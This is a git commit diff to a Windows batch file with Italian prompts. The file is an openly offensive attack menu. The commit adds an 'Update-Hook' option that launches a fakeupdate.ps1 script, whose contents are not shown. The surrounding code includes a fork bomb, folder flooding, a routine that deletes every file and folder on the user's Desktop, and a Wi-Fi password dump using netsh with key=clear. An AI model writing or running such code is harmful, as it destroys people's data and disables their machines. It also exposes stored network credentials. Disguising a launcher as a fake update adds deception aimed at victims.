0cc707a8aaf96ba9e9c778cd554471df157ba5c3
alpha840x <alpha840x@gmail.com>
2026-07-23 20:10:49 +0200

    Add fake update option and improve menu choices

--- OMEGAScript.bat
+++ OMEGAScript.bat
@@ -21,7 +21,8 @@ echo [1] Ciccio Flood
 echo [2] Folders Flood
 echo [3] Fork Bomb
 echo [4] Desktop madness
-echo [5] Wi-Fi passworld dump	
+echo [5] Wi-Fi passworld dump
+echo [6] Update-Hook	
 SET /P ANSWER=Attacco desiderato? 
 echo Hai scelto: %ANSWER%
 echo.
@@ -30,6 +31,7 @@ IF "%ANSWER%"=="2" goto :f
 IF "%ANSWER%"=="3" goto :b
 IF "%ANSWER%"=="4" goto :getdesktopname
 IF "%ANSWER%"=="5" goto :wifi
+IF "%ANSWER%"=="6" goto :fakeupdate
 pause
 echo Scelta non valida.
 goto :start
@@ -56,12 +58,21 @@ for %%f in (%USERPROFILE%\Desktop\*) do del %%f
 for /d %%d in ("%USERPROFILE%\Desktop\*") do rmdir /s /q "%%d"
 pause
 
+SET /P RETURN Tornare al menù Y/N?
+if "%RETURN%"=="Y" goto :start
+
 :wifi
 netsh wlan show profiles
 :nome
 echo Inserisci Nome Network:
 set /p network=
 netsh wlan show profile name="%network%" key=clear
+SET /P RETURN Tornare al menù Y/N?
+if "%RETURN%"=="Y" goto :start
 goto:nome
 
-:end
+:fakeupdate
+start fakeupdate.ps1
+goto:end
+
+:end       
